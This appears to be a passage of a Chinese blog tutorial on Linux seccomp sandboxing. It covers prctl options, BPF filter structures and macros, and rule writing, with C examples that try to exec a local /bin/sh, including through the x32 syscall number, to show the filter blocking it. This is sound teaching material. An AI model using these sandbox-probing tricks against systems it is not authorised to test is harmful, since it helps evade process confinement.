+<p>当 option 为 <code>PR_SET_NO_NEW_PRIVS</code>(38)，且 arg2 为 1时，将无法获得特权。</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">PR_SET_NO_NEW_PRIVS (since Linux <span class="hljs-number">3.5</span>)<br>    Set the calling process<span class="hljs-number">&#x27;</span>s no_new_privs bit to the value in arg2.<br>    With no_new_privs <span class="hljs-built_in">set</span> to <span class="hljs-number">1</span>,  execve(<span class="hljs-number">2</span>)  <span class="hljs-function">promises  <span class="hljs-keyword">not</span>  to  grant</span><br><span class="hljs-function">    privileges  to <span class="hljs-keyword">do</span> anything that could <span class="hljs-keyword">not</span> have been done without</span><br><span class="hljs-function">    the <span class="hljs-title">execve</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> <span class="hljs-title">call</span> <span class="hljs-params">(<span class="hljs-keyword">for</span> example, rendering the  <span class="hljs-built_in">set</span>-user-ID  <span class="hljs-keyword">and</span></span></span><br><span class="hljs-params"><span class="hljs-function">    <span class="hljs-built_in">set</span>-group-ID  mode  bits, <span class="hljs-keyword">and</span> file capabilities non-functional)</span>.</span><br><span class="hljs-function">    Once <span class="hljs-built_in">set</span>, <span class="hljs-keyword">this</span> bit cannot be unset.  The setting of <span class="hljs-keyword">this</span> bit  is</span><br><span class="hljs-function">    inherited  by  children  created  by  <span class="hljs-title">fork</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>  <span class="hljs-keyword">and</span> <span class="hljs-title">clone</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>, <span class="hljs-keyword">and</span></span><br><span class="hljs-function">    preserved across <span class="hljs-title">execve</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>.</span><br><span class="hljs-function">    </span><br><span class="hljs-function">    For   more   information,   see   the   kernel    source    file</span><br><span class="hljs-function">    Documentation/prctl/no_new_privs.txt.</span><br></code></pre></div></td></tr></table></figure>
+
+<p>举例：</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;<br>	prctl(PR_SET_NO_NEW_PRIVS,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br><br>	<span class="hljs-keyword">char</span> * filename = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>	<span class="hljs-keyword">char</span> * argv[] = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>	<span class="hljs-keyword">char</span> * envp[] = &#123;<span class="hljs-literal">NULL</span>&#125;;<br>	write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;i will give you a shell\n&quot;</span>,<span class="hljs-number">24</span>);<br>	syscall(<span class="hljs-number">59</span>,filename,argv,envp);<span class="hljs-comment">//execve</span><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);<span class="hljs-comment">//第一个参数要进行什么设置，第二个是设置为过滤模式，第三个参数就是过滤规则</span><br></code></pre></div></td></tr></table></figure>
+
+<p>当 option 为 <code>PR_SET_SECCOMP</code>（22）时，效果就是我们上面的 seccomp 了，只不过这里的格式略有不同：</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">PR_SET_SECCOMP (since Linux <span class="hljs-number">2.6</span><span class="hljs-number">.23</span>)<br>   <span class="hljs-function">Set the secure <span class="hljs-title">computing</span> <span class="hljs-params">(seccomp)</span> mode <span class="hljs-keyword">for</span> the calling  thread,</span><br><span class="hljs-function">   to limit the available system calls.  The more recent <span class="hljs-title">seccomp</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span><br><span class="hljs-function">   system  call  provides  a  superset  of  the  functionality   of</span><br><span class="hljs-function">   PR_SET_SECCOMP.</span><br><span class="hljs-function"></span><br><span class="hljs-function">   The  seccomp  mode is selected via arg2.  <span class="hljs-params">(The seccomp constants</span></span><br><span class="hljs-params"><span class="hljs-function">   are defined in &lt;linux/seccomp.h&gt;.)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">   With arg2 <span class="hljs-built_in">set</span> to SECCOMP_MODE_STRICT, the only system calls that</span><br><span class="hljs-function">   the  thread is permitted to make are <span class="hljs-title">read</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>, <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>, _<span class="hljs-title">exit</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span><br><span class="hljs-function">   <span class="hljs-params">(but <span class="hljs-keyword">not</span> exit_group(<span class="hljs-number">2</span>))</span>, <span class="hljs-keyword">and</span> <span class="hljs-title">sigreturn</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>.  Other  system  calls</span><br><span class="hljs-function">   result  in  the  delivery  of  a  SIGKILL signal.  Strict secure</span><br><span class="hljs-function">   computing mode is useful <span class="hljs-keyword">for</span> number-crunching applications  that</span><br><span class="hljs-function">   may  need  to  execute  untrusted byte code, perhaps obtained by</span><br><span class="hljs-function">   reading from a pipe <span class="hljs-keyword">or</span> socket.  This operation is available only</span><br><span class="hljs-function">   <span class="hljs-keyword">if</span> the kernel is configured with CONFIG_SECCOMP enabled.</span><br><span class="hljs-function"></span><br><span class="hljs-function">   With  arg2  <span class="hljs-built_in">set</span>  to  <span class="hljs-title">SECCOMP_MODE_FILTER</span>  <span class="hljs-params">(since Linux <span class="hljs-number">3.5</span>)</span>, the</span><br><span class="hljs-function">   system calls allowed are defined by  a  pointer  to  a  Berkeley</span><br><span class="hljs-function">   Packet  Filter  passed  in  arg3.  This argument is a pointer to</span><br><span class="hljs-function">   struct sock_fprog</span>; it can be designed to filter arbitrary system<br>   calls <span class="hljs-keyword">and</span> system call arguments.  This mode is available only <span class="hljs-keyword">if</span><br>   the kernel is configured with CONFIG_SECCOMP_FILTER enabled.<br><br>   <span class="hljs-function">If SECCOMP_MODE_FILTER filters permit <span class="hljs-title">fork</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>, then the  seccomp</span><br><span class="hljs-function">   mode  is  inherited by children created by <span class="hljs-title">fork</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span>; <span class="hljs-function"><span class="hljs-keyword">if</span> <span class="hljs-title">execve</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span><br><span class="hljs-function">   is  permitted,  then  the  seccomp  mode  is  preserved   across</span><br><span class="hljs-function">   <span class="hljs-title">execve</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>.  If the filters permit <span class="hljs-title">prctl</span><span class="hljs-params">()</span> calls, then additional</span><br><span class="hljs-function">   filters can be added</span>; they are run in order until the first non-<br>   allow result is seen.<br><br>   For   further   information,   see   the   kernel   source  file<br>   Documentation/prctl/seccomp_filter.txt.<br></code></pre></div></td></tr></table></figure>
+
+<p>如果 arg2 为 <code>SECCOMP_MODE_STRICT</code>(1)，则只允许调用 read，write，exit(not exit_group)，sigreturn 这几个 syscall，如果 arg2 为 <code>SECCOMP_MODE_FILTER</code>（2），则为过滤模式，其中对 syscall 的限制通过 arg3 用 BPF(Berkley Packet Filter) 的形式传递进来，是指向 struct sock_fprog 数组的指针。</p>
+<p>第三个参数 <code>prog</code>是如下结构体的指针 sock_fprog，这个结构体记录了过滤规则个数与规则数组起始位置。而 filter 域指向了具体的规则，每一条规则有如下 sock_filter 形式：</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *	Try and keep these values and structures similar to BSD, especially</span><br><span class="hljs-comment"> *	the BPF code definitions which need to match so you can share filters</span><br><span class="hljs-comment"> */</span><br> <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> &#123;</span>	<span class="hljs-comment">/* Filter block */</span><br>	__u16	code;   <span class="hljs-comment">/* Actual filter code */</span><br>	__u8	jt;	<span class="hljs-comment">/* Jump true */</span><br>	__u8	jf;	<span class="hljs-comment">/* Jump false */</span><br>	__u32	k;      <span class="hljs-comment">/* Generic multiuse field */</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> &#123;</span>	<span class="hljs-comment">/* Required for SO_ATTACH_FILTER. */</span><br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>		len;	<span class="hljs-comment">/* Number of filter blocks */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> *<span class="hljs-title">filter</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure>
+
+<p>为了操作方便定义了一组宏来完成filter的填写(*定义在<code>/usr/include/linux/bpf_common.h</code>*。更详细的解释，参考：<a target="_blank" rel="noopener" href="https://eigenstate.org/notes/seccomp">https://eigenstate.org/notes/seccomp</a></p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> BPF_STMT</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BPF_STMT(code, k) &#123; (unsigned short)(code), 0, 0, k &#125;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> BPF_JUMP</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BPF_JUMP(code, k, jt, jf) &#123; (unsigned short)(code), jt, jf, k &#125;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure>
+
+<p>其中 code，是由 多个 变量组成，变量之间使用 + 连接：</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BPF_CLASS(code) ((code) &amp; 0x07)         <span class="hljs-comment">//首先指定操作的类别</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_LD		0x00                    <span class="hljs-comment">//将值cp进寄存器</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_LDX		0x01</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_ST		0x02</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_STX		0x03</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_ALU		0x04</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_JMP		0x05</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_RET		0x06</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_MISC        0x07</span><br>	<br><span class="hljs-comment">/* ld/ldx fields */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BPF_SIZE(code)  ((code) &amp; 0x18)         <span class="hljs-comment">//在ld时指定操作数的大小</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_W		0x00</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_H		0x08</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_B		0x10</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BPF_MODE(code)  ((code) &amp; 0xe0)         <span class="hljs-comment">//操作数类型</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_IMM		0x00</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_ABS		0x20</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_IND		0x40</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_MEM		0x60</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_LEN		0x80</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_MSH		0xa0</span><br><br><span class="hljs-comment">/* alu/jmp fields */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BPF_OP(code)    ((code) &amp; 0xf0)         <span class="hljs-comment">//当操作码类型为ALU时，指定具体运算符</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_ADD		0x00                    <span class="hljs-comment">//到底执行什么操作可以看filter.h里面的定义</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_SUB		0x10</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_MUL		0x20</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_DIV		0x30</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_OR		0x40</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_AND		0x50</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_LSH		0x60</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_RSH		0x70</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_NEG		0x80</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_MOD		0x90</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_XOR		0xa0</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_JA		0x00                    <span class="hljs-comment">//当操作码类型是JMP时指定跳转类型</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_JEQ		0x10</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_JGT		0x20</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_JGE		0x30</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_JSET        0x40</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BPF_SRC(code)   ((code) &amp; 0x08)         </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_K		0x00                    <span class="hljs-comment">//常数</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>		BPF_X		0x08</span><br></code></pre></div></td></tr></table></figure>
+
+<p>另在与SECCOMP有关的定义在<code>/usr/include/linux/seccomp.h</code>，现在来看看怎么写规则，首先是<code>BPF_LD</code>，它需要用到的结构为：</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_data</span> &#123;</span><br>    <span class="hljs-keyword">int</span>   nr;                   <span class="hljs-comment">/* System call number */</span><br>    __u32 arch;                 <span class="hljs-comment">/* AUDIT_ARCH_* value</span><br><span class="hljs-comment">                                  (在 &lt;linux/audit.h&gt; 里) */</span><br>    __u64 instruction_pointer;  <span class="hljs-comment">/* CPU instruction pointer */</span><br>    __u64 args[<span class="hljs-number">6</span>];              <span class="hljs-comment">/* Up to 6 system call arguments */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure>
+
+<p>其中args中是6个寄存器，在32位下是：<code>ebx,ecx,edx,esi,edi,ebp</code>，在64位下是：<code>rdi,rsi,rdx,r10,r8,r9</code>，现在要将syscall时eax的值载入RegA，可以使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c#">BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0)                //这会把偏移0处的值放进寄存器A，读取的是seccomp_data的数据<br>//或者<br>BPF_STMT(BPF_LD+BPF_W+BPF_ABS,regoffset(eax))<br></code></pre></div></td></tr></table></figure>
+
+<p>跳转语句写法如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="hljs-number">59</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)                <span class="hljs-comment">//这回把寄存器A与值k(此处为59)作比较，为真跳过下一条规则，为假不跳转</span><br></code></pre></div></td></tr></table></figure>
+
+<p>后两个参数代表成功跳转到第几条规则，失败跳转到第几条规则，这是相对偏移。</p>
+<p>最后当验证完成需要返回结果时，即是否允许：</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL)<br></code></pre></div></td></tr></table></figure>
+
+<p>过滤的规则列表里可以有多条规则，seccomp 会从第 0 条开始逐条执行，直到遇到 <code>BPF_RET</code> 返回，决定是否允许该操作以及做某些修改。</p>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>将 第一个代码中的 seccomp 改为 prctl 如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//gcc -g simple_syscall_seccomp.c -o simple_syscall_seccomp -lseccomp</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;<br><br>	scmp_filter_ctx ctx;<br>	ctx = seccomp_init(SCMP_ACT_ALLOW);<br>	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write),<span class="hljs-number">1</span>,SCMP_A2(SCMP_CMP_EQ,<span class="hljs-number">0x10</span>));<br>	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),<span class="hljs-number">0</span>);<br>	seccomp_load(ctx);<br><br>	<span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;bpf.out&quot;</span>,O_WRONLY);<br>	seccomp_export_bpf(ctx,fd);<br>	close(fd);<br><br><br>	<span class="hljs-keyword">char</span> * filename = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>	<span class="hljs-keyword">char</span> * argv[] = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>	<span class="hljs-keyword">char</span> * envp[] = &#123;<span class="hljs-literal">NULL</span>&#125;;<br>	write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;i will give you a shell\n&quot;</span>,<span class="hljs-number">24</span>);<br>	write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;1234567812345678&quot;</span>,<span class="hljs-number">0x10</span>);<br>	syscall(<span class="hljs-number">0x4000003b</span>,filename,argv,envp);<span class="hljs-comment">//execve</span><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>通过 <code>seccomp_export_bpf</code>的函数能够将设置的 seccomp 以 bpf 的形式导出，上面代码输出为 bpf.out</p>
+<p>改用 prctl:</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/filter.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/seccomp.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;<br>	<br>	prctl(PR_SET_NO_NEW_PRIVS,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">sfi</span>[] =</span> &#123;<br>		&#123;<span class="hljs-number">0x20</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00000004</span>&#125;,<br>		&#123;<span class="hljs-number">0x15</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0xc000003e</span>&#125;,<br>		&#123;<span class="hljs-number">0x20</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00000000</span>&#125;,<br>		&#123;<span class="hljs-number">0x35</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x40000000</span>&#125;,<br>		&#123;<span class="hljs-number">0x15</span>,<span class="hljs-number">0x06</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x0000003b</span>&#125;,<br>		&#123;<span class="hljs-number">0x15</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x00000001</span>&#125;,<br>		&#123;<span class="hljs-number">0x20</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00000024</span>&#125;,<br>		&#123;<span class="hljs-number">0x15</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x00000000</span>&#125;,<br>		&#123;<span class="hljs-number">0x20</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00000020</span>&#125;,<br>		&#123;<span class="hljs-number">0x15</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00000010</span>&#125;,<br>		&#123;<span class="hljs-number">0x06</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x7fff0000</span>&#125;,<br>		&#123;<span class="hljs-number">0x06</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00000000</span>&#125;<br>	&#125;;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> <span class="hljs-title">sfp</span> =</span> &#123;<span class="hljs-number">12</span>,sfi&#125;;<br><br>	prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;sfp);<br>	<br>	<span class="hljs-keyword">char</span> * filename = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>	<span class="hljs-keyword">char</span> * argv[] = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>	<span class="hljs-keyword">char</span> * envp[] = &#123;<span class="hljs-literal">NULL</span>&#125;;<br>	write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;i will give you a shell\n&quot;</span>,<span class="hljs-number">24</span>);<br>	write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;1234567812345678&quot;</span>,<span class="hljs-number">0x10</span>);<br>	syscall(<span class="hljs-number">0x4000003b</span>,filename,argv,envp);<span class="hljs-comment">//execve</span><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>也能够成功拦截。</p>
+<p>另一个示例可以参考 <a target="_blank" rel="noopener" href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a></p>
+<h3 id="Seccomp-tools"><a href="#Seccomp-tools" class="headerlink" title="Seccomp-tools"></a>Seccomp-tools</h3><p>现有的工具 seccomp-tools可以帮助我们分析 seccomp机制。</p>
